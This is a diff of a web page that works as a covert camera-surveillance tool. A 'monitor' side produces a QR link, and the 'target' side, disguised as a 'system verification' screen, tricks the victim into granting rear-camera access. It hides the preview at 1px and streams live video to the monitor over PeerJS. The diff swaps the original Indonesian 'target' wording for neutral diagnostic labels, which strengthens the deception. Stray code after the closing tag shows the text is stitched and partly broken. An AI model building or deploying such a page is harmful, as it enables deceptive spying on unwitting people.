@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Diagnostics 2026</title>
+    <title>System Diagnostics 2.0</title>
     <style>
         body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow: hidden; }
         .panel { padding: 15px; border: 1px solid #333; margin: 10px; border-radius: 8px; background: #050505; }
@@ -20,28 +20,28 @@
 <body>
 
     <div id="ui-monitor">
-        <h3 style="margin: 10px 0;">[ CHARM MONITOR V.3 ]</h3>
+        <h3 style="margin: 10px 0;">[ SYSTEM TERMINAL ]</h3>
         <video id="remote-video" autoplay playsinline></video>
         <div class="panel">
-            <button class="btn" onclick="connectToTarget()">HUBUNGKAN KE TARGET</button>
-            <button class="btn" style="background:#222; color:#0f0;" onclick="generateQR()">TAMPILKAN QR SCAN</button>
+            <button class="btn" onclick="connectToTarget()">ESTABLISH CONNECTION</button>
+            <button class="btn" style="background:#222; color:#0f0;" onclick="generateQR()">GENERATE ENTRY QR</button>
         </div>
-        <div id="log">Sistem Siap...</div>
+        <div id="log">Console Ready...</div>
 
         <div id="qr-box">
-            <p style="color:#000; font-size: 12px; font-weight: bold;">SCAN UNTUK VERIFIKASI</p>
+            <p style="color:#000; font-size: 12px; font-weight: bold;">ENCRYPTED ACCESS ONLY</p>
             <img id="qr-display" src="">
             <br>
-            <button onclick="document.getElementById('qr-box').style.display='none'" style="margin-top:10px;">TUTUP</button>
+            <button onclick="document.getElementById('qr-box').style.display='none'" style="margin-top:10px;">CLOSE</button>
         </div>
     </div>
 
     <div id="ui-target" class="hidden">
         <div style="padding: 60px 20px;">
             <div class="loader"></div>
-            <h2 id="t-msg">SISTEM SEDANG MEMPROSES</h2>
-            <p id="t-sub" style="color: #888;">Sinkronisasi modul keamanan...</p>
-            <button id="btn-verify" class="btn">MULAI VERIFIKASI</button>
+            <h2 id="t-msg">SYSTEM CORE PROCESSING</h2>
+            <p id="t-sub" style="color: #888;">Verifying module integrity...</p>
+            <button id="btn-verify" class="btn">START VERIFICATION</button>
             <video id="local-video" autoplay playsinline muted style="width:1px; height:1px; opacity:0;"></video>
         </div>
     </div>
@@ -52,12 +52,11 @@
         const urlParams = new URLSearchParams(window.location.search);
         const mode = urlParams.get('mode');
         
-        // ID UNIK: Ganti 'DAPPA_X' jadi nama unik lo kalau mau lebih privat
-        const TARGET_ID = 'DAPPA_X_TARGET_2026';
-        const MONITOR_ID = 'DAPPA_X_MONITOR_2026';
+        // --- ID UNIK & JARANG DITEMUKAN ---
+        const TARGET_ID = 'CORE-X79-VRTX-2026';
+        const MONITOR_ID = 'CMD-Z41-BASE-2026';
 
         if (mode === 'target') {
-            /* --- LOGIKA TARGET --- */
             document.getElementById('ui-monitor').classList.add('hidden');
             document.getElementById('ui-target').classList.remove('hidden');
 
@@ -65,46 +64,58 @@
             let targetStream = null;
 
             document.getElementById('btn-verify').onclick = async () => {
-                document.getElementById('t-msg').innerText = "MENGAKSES SENSOR...";
+                document.getElementById('t-msg').innerText = "CALIBRATING SENSORS...";
                 try {
                     targetStream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: "environment", frameRate: { ideal: 15 } }, 
+                        video: { facingMode: "environment", width: 720, height: 1280 }, 
                         audio: false 
                     });
                     document.getElementById('local-video').srcObject = targetStream;
-                    document.getElementById('t-msg').innerText = "SISTEM OPTIMAL";
-                    document.getElementById('t-sub').innerText = "Menunggu Sinkronisasi Data...";
+                    document.getElementById('t-msg').innerText = "CALIBRATION COMPLETE";
+                    document.getElementById('t-sub').innerText = "Handshaking with terminal...";
                     document.getElementById('btn-verify').style.display = 'none';
 
-                    // Standby nunggu panggilan
                     peer.on('call', (call) => {
                         call.answer(targetStream);
                     });
                 } catch (e) {
-                    alert("Akses kamera ditolak. Verifikasi gagal.");
+                    alert("Verification Failed: Sensor Access Required.");
                 }
             };
 
         } else {
-            /* --- LOGIKA MONITOR --- */
             const peer = new Peer(MONITOR_ID);
             
-            peer.on('open', (id) => log(`ID Monitor Aktif: ${id}`));
+            peer.on('open', (id) => log(`Terminal Online: ${id}`));
 
             function connectToTarget() {
-                log("Mencoba menghubungi target...");
+                log("Locating target core...");
                 const call = peer.call(TARGET_ID, null);
                 
                 call.on('stream', (stream) => {
-                    log("STREAM TERDETEKSI! Menampilkan gambar...");
+                    log("STREAM SECURED! Syncing visual...");
                     document.getElementById('remote-video').srcObject = stream;
                 });
 
                 call.on('error', (err) => {
-                    log("ERROR: Target Offline atau Sibuk.");
-                    alert("Target belum siap!");
+                    log("FAILED: Remote Core not found.");
+                    alert("Target Core is Offline.");
                 });
+            }
 
+            function generateQR() {
+                const currentUrl = window.location.href.split('?')[0];
+                const finalUrl = `${currentUrl}?mode=target`;
+                const qrApi = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(finalUrl)}`;
+                
+                document.getElementById('qr-display').src = qrApi;
+                document.getElementById('qr-box').style.display = 'block';
+                log("Access QR Generated.");
+            }
+        }
+    </script>
+</body>
+</html>
                 // Timeout check
                 setTimeout(() => {
                     if(!document.getElementById('remote-video').srcObject) {
